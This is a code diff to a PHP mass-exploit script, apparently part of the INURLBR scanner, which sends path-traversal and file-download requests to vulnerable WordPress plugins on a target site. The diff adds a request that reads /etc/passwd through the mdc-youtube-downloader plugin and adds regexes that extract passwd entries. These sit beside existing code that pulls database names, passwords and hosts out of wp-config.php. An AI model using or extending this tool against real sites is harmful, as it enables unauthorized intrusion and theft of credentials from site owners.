@@ -267,6 +267,9 @@ __request($argv[1], '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-ad
 
 __request($argv[1], '/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=../../../../wp-config.php');
 
+__request($argv[1], '/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd');
+
+
 function __request($url, $plugin) {
 
     $objcurl = curl_init();
@@ -278,6 +281,8 @@ function __request($url, $plugin) {
     curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($objcurl, CURLOPT_USERAGENT, "::INURLBR::/1.0.1 (compatible; MSIE 5.01; Linux 5.0)");
     curl_setopt($objcurl, CURLOPT_CONNECTTIMEOUT, 20);
+    curl_setopt($objcurl, CURLOPT_TIMEOUT, 10);
+    
     $corpo = curl_exec($objcurl);
 
     if (preg_match_all("(<b>/.*./wp-content/)", $corpo, $caminho)) {
@@ -286,7 +291,7 @@ function __request($url, $plugin) {
     }
 __plus();
 
-    if (preg_match("#DB_NAME#i", $corpo) || preg_match("#readfile(#i", $corpo)) {
+    if (preg_match("#DB_NAME#i", $corpo) || preg_match("#root#i", $corpo) || preg_match("#readfile(#i", $corpo)) {
 
 //-----------------------------------------------------------------------------
         preg_match_all("(DB_NAME.*')", $corpo, $status['DB_NAME']);
@@ -294,6 +299,12 @@ __plus();
         preg_match_all("(DB_PASSWORD.*')", $corpo, $status['DB_PASSWORD']);
         preg_match_all("(DB_HOST.*')", $corpo, $status['DB_HOST']);
         preg_match_all("(DB_CHARSET.*')", $corpo, $status['DB_CHARSET']);
+        #FILE PASSWORD
+        preg_match_all("(root:.*)", $corpo, $status['pwd1']);
+        preg_match_all("(sbin:.*)", $corpo, $status['pwd2']);
+        preg_match_all("(ftp:.*)", $corpo, $status['pwd3']);
+        preg_match_all("(nobody:.*)", $corpo, $status['pwd4']);
+        preg_match_all("(mail:.*)", $corpo, $status['pwd5']);
 //-----------------------------------------------------------------------------
 __plus();
         $res = "\n------------------------------------------------------------------------------------------------------------------\n\033[0;32m0x ". date("h:m:s") ." [INFO][VULN]::    \033[1;37m [ " . date("d-m-Y H:i:s") . " ]\n";
@@ -302,6 +313,7 @@ __plus();
         $res.= ("::" . $status['DB_PASSWORD'][0][0]);
         $res.= ("::" . $status['DB_HOST'][0][0]);
         $res.= ("::" . $status['DB_CHARSET'][0][0]);
+        $res.= (preg_match("#root#i", $corpo) ? "\n\033[0;32m0x ". date("h:m:s") ."[INFO][VULN][FILE_PASSWORD]::\033[1;37m{$status['pwd1'][0][0]} - {$status['pwd2'][0][0]} - {$status['pwd3'][0][0]} - {$status['pwd4'][0][0]} - {$status['pwd5'][0][0]}\033[0m" : NULL);
         $res.= "\n\033[0;32m0x ". date("h:m:s") ." [INFO][VULN][URL]::\033[1;37m{$url}{$plugin}\033[0m";
         $res.= "\n------------------------------------------------------------------------------------------------------------------\n\033[0m";
         print $res;
